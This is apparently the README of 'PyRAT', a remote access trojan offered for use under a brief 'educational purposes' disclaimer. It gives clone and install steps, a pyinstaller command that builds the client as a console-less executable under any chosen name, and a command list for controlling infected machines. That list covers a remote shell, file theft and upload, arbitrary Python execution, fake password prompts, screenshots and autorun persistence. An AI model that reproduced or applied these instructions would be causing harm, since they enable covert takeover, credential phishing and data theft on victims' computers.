# Disclaimer
Usage of PyRAT Hacking Tool for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developer assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
# Installation
1. Clone GitHub repository using command `git clone https://github.com/0xhardcoder/PyRat`
2. Install PyRAT dependencies using command `pip3 install -r requirments.txt`<br />
Now you're ready to run your own server!
# Compiling
Make sure that pyinstaller is installed. If not do `pip3 install pyinstaller`
Compile client.py using command `pyinstaller client.py --noconsole --name NameOfExe --icon NONE`
# Usage
To run server do `python3 server.py`<br />
Commands:
```
        targets                      - show all connected computers
        shell [id]                   - connect to remote PC with id [id]
        download [filename]          - download [filename] from remote PC
        upload [filename]            - upload [filename] to remote PC
        cd [dirname]                 - change working directory to [dirname] on remote PC
        uninstall                    - uninstalls software from remote PC
        cursorpos                    - get cursor position on remote PC
        cursormove [X] [Y]           - set cursor position on remote PC
        touch [filename]             - creates a file with name [filename] on remote PC
        appendfile [filename] [text] - append [text] to [filename] on remote PC
        msgbox [type] [text] [title] - Starts message box with text [text] and title [title] on remote PC. Types: 0 = alert, 1 = confirm, 2 = prompt, 3 = password
        pyexec [Python expression]   - exec([Python expression]) on remote PC
        pyexecf [filename]           - Execute Python file on remote PC
        beep    [Freq] [Duration]    - Beep([Freq], [Duration]) on remote PC
        showdesktop                  - Shows desktop on remote PC 
        screenshot                   - Screenshot screen and saves it on remote PC with random name in current working directory
        private_ip                   - Shows private IP address of remote PC
        autorun                      - Adds software to autorun on remote PC
        swapmouse                    - Swaps mouse buttons on remote PC
```
